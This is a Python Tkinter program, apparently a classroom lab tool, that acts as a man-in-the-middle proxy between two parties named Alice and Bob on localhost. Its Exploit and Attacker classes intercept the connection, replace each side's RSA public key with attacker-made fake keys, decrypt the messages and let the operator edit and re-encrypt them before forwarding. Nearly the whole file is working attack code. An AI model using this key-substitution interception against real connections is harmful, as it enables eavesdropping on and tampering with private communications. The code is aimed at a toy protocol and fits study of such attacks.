import tkinter as tk
from tkinter import Scrollbar
import random
import socket
import threading
import os
import signal
import sys
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes


# Target host and port
TARGET_HOST = 'localhost'
TARGET_PORT = 3001

# Proxy server port
PROXY_PORT = 3000

class Exploit:
	def __init__(self):
		self.alicepubkey = None
		self.bobpubkey = None
		self.private_key_foralice = None
		self.public_key_foralice = None
		self.private_key_forbob = None
		self.public_key_forbob = None

	def generateKey(self):
		self.private_key_foralice = rsa.generate_private_key(
			public_exponent=65537,
			key_size=2048,
			backend=default_backend()
		)
		self.public_key_foralice = self.private_key_foralice.public_key()
		self.private_key_forbob = rsa.generate_private_key(
			public_exponent=65537,
			key_size=2048,
			backend=default_backend()
		)
		self.public_key_forbob = self.private_key_forbob.public_key()
		alprivpem = self.private_key_foralice.private_bytes(
			encoding=serialization.Encoding.PEM,
			format=serialization.PrivateFormat.PKCS8,
			encryption_algorithm=serialization.NoEncryption()
		)
		alpublic_key_pem = self.public_key_foralice.public_bytes(
			encoding=serialization.Encoding.PEM,
			format=serialization.PublicFormat.SubjectPublicKeyInfo
		)
		boprivpem = self.private_key_forbob.private_bytes(
			encoding=serialization.Encoding.PEM,
			format=serialization.PrivateFormat.PKCS8,
			encryption_algorithm=serialization.NoEncryption()
		)
		bopublic_key_pem = self.public_key_forbob.public_bytes(
			encoding=serialization.Encoding.PEM,
			format=serialization.PublicFormat.SubjectPublicKeyInfo
		)
		print('alprivpem', alprivpem)
		print('alpublic_key_pem', alpublic_key_pem)
		print('boprivpem', boprivpem)
		print('bopublic_key_pem', bopublic_key_pem)


	def loadalicepubkey(self, msg):
		msg = bytes.fromhex(msg)
		if b"PUB@@" in msg[:5]:
			response = base64.b64decode(msg[5:])
			self.alicepubkey = serialization.load_der_public_key(response, backend=default_backend())
		else:
			print('something wrong 1')
		if self.bobpubkey == None:
			print('masuk3')
			self.generateKey()
	
	def loadbobpubkey(self, msg):
		msg = bytes.fromhex(msg)
		if b"PUB@@" in msg[:5]:
			response = base64.b64decode(msg[5:])
			self.bobpubkey = serialization.load_der_public_key(response, backend=default_backend())
		else:
			print('something wrong 2')
		if self.alicepubkey == None:
			print('masukc')
			self.generateKey()

	def getpubkeyforalice(self):
		serialized = self.public_key_foralice.public_bytes(serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)
		message = (b"PUB" + b"@@" + base64.b64encode(serialized)).hex()
		return message

	def getpubkeyforbob(self):
		serialized = self.public_key_forbob.public_bytes(serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)
		message = (b"PUB" + b"@@" + base64.b64encode(serialized)).hex()
		return message

	def encrypt(self, message, subject):
		if subject == 'alice':
			usekey = self.alicepubkey
		elif subject == 'bob':
			usekey = self.bobpubkey
		else:
			print('something wrong3')
		ciphertext = usekey.encrypt(
			message.encode(),
			padding.PKCS1v15()
		)
		return ciphertext.hex().encode()

	def decrypt(self, message, subject):
		if subject == 'alice':
			usekey = self.private_key_foralice
		elif subject == 'bob':
			usekey = self.private_key_forbob
		else:
			print('something wrong3')
		message = bytes.fromhex(message)
		plain_text = usekey.decrypt(
			message,
			padding.PKCS1v15()
		)

		return plain_text

class Attacker:
	def __init__(self, instance):
		self.instance = instance

	def handle_client(self):
		try:
			while True:
				client_data = self.client_socket.recv(4096)
				if not client_data:
					print('disconnected')
					exit()
				print('client:', client_data.decode())
				if self.instance.exploit.alicepubkey != None:
					client_data = self.instance.exploit.decrypt(client_data.decode(), 'alice')
				self.instance.addlog('client:'+client_data.decode())
				self.instance.updatetamperbox('alice', client_data.decode())
				print('client:', client_data.decode())
				'''
				client_to_server = input("client (tamper): ").encode()
				if client_to_server == b"fw": #forward message
					client_to_server = client_data
				elif client_to_server == b"ex":
					self.attacker_socket.close()
					self.client_socket.close()
					self.server_socket.close()

					sys.exit(0)
				self.server_socket.sendall(client_to_server)
				'''
			self.attacker_socket.close()
		except Exception as e:
			print("something's wrong1", e)

	def handle_server(self):
		try:
			while True:
				server_data = self.server_socket.recv(4096)
				if not server_data:
					print('disconnected')
					exit()
				print('server:', server_data.decode())
				if self.instance.exploit.bobpubkey != None:
					server_data = self.instance.exploit.decrypt(server_data.decode(), 'bob')
				self.instance.addlog('server:'+server_data.decode())
				self.instance.updatetamperbox('bob', server_data.decode())
				'''
				server_to_client = input("server (tamper): ").encode()
				if server_to_client == b"fw": #forward message
					server_to_client = server_data
				elif server_to_client == b"ex":
					self.attacker_socket.close()
					self.client_socket.close()
					self.server_socket.close()
					sys.exit(0)
				self.client_socket.sendall(server_to_client)
				'''
			self.attacker_socket.close()
		except Exception as e:
			print("something's wrong2", e)
	

	def handle_incoming(self):
		server_thread = threading.Thread(target=self.handle_server)
		server_thread.start()

		client_thread = threading.Thread(target=self.handle_client)
		client_thread.start()

	def main(self):
		try:
			self.attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.attacker_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			self.attacker_socket.bind(('0.0.0.0', PROXY_PORT))
			self.attacker_socket.listen(1)
			print('here')
			self.client_socket, client_addr = self.attacker_socket.accept()
			self.instance.addlog('accepted connection from' + str(client_addr))
		
			self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.server_socket.connect((TARGET_HOST, TARGET_PORT))
			def signal_handler(signal, frame):
				sys.exit(0)
			signal.signal(signal.SIGINT, signal_handler)
			
			self.handle_incoming()
		except Exception as e:
			print("something's wrong", e)


class RandomNumberGenerator(tk.Tk):
	def __init__(self):
		super().__init__()

		self.title("Ceritanya ini mitm")
		self.geometry("400x300")

		# Label for informing if the number is even or odd
		
		# Upper box for showing the numbers
		self.upper_box_label = tk.Label(self, text="Received From", font=("Helvetica", 16))
		self.upper_box_label.pack()

		self.info_label = tk.Label(self, text="", font=("Helvetica", 12))
		self.info_label.pack()

		self.upper_box = tk.Text(self, font=("Helvetica", 14), height=3, width=3)
		self.upper_box.pack(fill=tk.BOTH, expand=True)

		self.button_frame = tk.Frame(self)
		self.button_frame.pack(pady=10)

		self.set_button1 = tk.Button(self.button_frame, text="Send", font=("Helvetica", 14), command=self.sendclient)
		self.set_button1.pack(side=tk.LEFT, padx=5)

		self.set_button1 = tk.Button(self.button_frame, text="Alice Pubkey", font=("Helvetica", 14), command=self.alicepubkey)
		self.set_button1.pack(side=tk.LEFT, padx=5)

		self.set_button1 = tk.Button(self.button_frame, text="Bob Pubkey", font=("Helvetica", 14), command=self.bobpubkey)
		self.set_button1.pack(side=tk.LEFT, padx=5)

		self.set_button2 = tk.Button(self.button_frame, text="Exit", font=("Helvetica", 14), command=self.exit)
		self.set_button2.pack(side=tk.LEFT, padx=5)

		# Lower box for the moved numbers
		self.lower_box_label = tk.Label(self, text="Log", font=("Helvetica", 16))
		self.lower_box_label.pack()

		self.lower_box = tk.Text(self, font=("Helvetica", 14), height=3, width=3, state="disabled")
		self.lower_box.pack(fill=tk.BOTH, expand=True)

		# Button to move numbers

		self.scrollbar = Scrollbar(self, command=self.lower_box.yview)
		self.scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

		self.lower_box.config(yscrollcommand=self.scrollbar.set)

		self.attacker = Attacker(self)
		self.attacker.main()
		self.exploit = Exploit()
		# self.update_number()

	def updatetamperbox(self, sender, text):
		self.info_label.config(text=sender)
		self.upper_box.delete("1.0", tk.END)
		self.upper_box.insert(tk.END, text)

	def addlog(self, text):
		self.lower_box.config(state="normal")
		self.lower_box.insert(tk.END, text + "\n")
		self.lower_box.config(state="disabled")
		
	def sendclient(self):
		content = self.upper_box.get("1.0", tk.END).strip()
		sender = self.info_label.cget("text")
		if sender == "bob":
			if self.exploit.alicepubkey!= None:
				content = self.exploit.encrypt(content, 'alice').decode()				
			self.attacker.client_socket.sendall(content.encode() + b'\n')
			self.addlog("send to client: " + content)
		elif sender == "alice":
			if self.exploit.bobpubkey!= None:
				content = self.exploit.encrypt(content, 'bob').decode()	
			self.attacker.server_socket.sendall(content.encode() + b'\n')
			self.addlog("send to server: " + content)
		# Clear upper box after moving
		self.upper_box.delete("1.0", tk.END)
	
	def exit(self):
		self.attacker.attacker_socket.close()
		self.attacker.client_socket.close()
		self.attacker.server_socket.close()
		sys.exit(0)
	
	def alicepubkey(self):
		content = self.upper_box.get("1.0", tk.END).strip()
		self.exploit.loadalicepubkey(content)
		fakealicepubkey = self.exploit.getpubkeyforbob()
		print('ini fake alice pubkey untuk bob', fakealicepubkey)
		print("content|" + content + "|fake" + fakealicepubkey + "|")
		self.attacker.server_socket.sendall(fakealicepubkey.encode() + b'\n')
		self.addlog("send fake pubkey to server: " + fakealicepubkey)
		self.upper_box.delete("1.0", tk.END)
	
	def bobpubkey(self):
		content = self.upper_box.get("1.0", tk.END).strip()
		self.exploit.loadbobpubkey(content)
		fakebobpubkey = self.exploit.getpubkeyforalice()
		print('ini fake bobpubkey untuk alice', fakebobpubkey)
		print("content|" + content + "|fake" + fakebobpubkey + "|")
		self.attacker.client_socket.sendall(fakebobpubkey.encode() + b'\n')
		self.addlog("send fake pubkey to client: " + fakebobpubkey)
		self.upper_box.delete("1.0", tk.END)
		


app = RandomNumberGenerator()
app.mainloop()





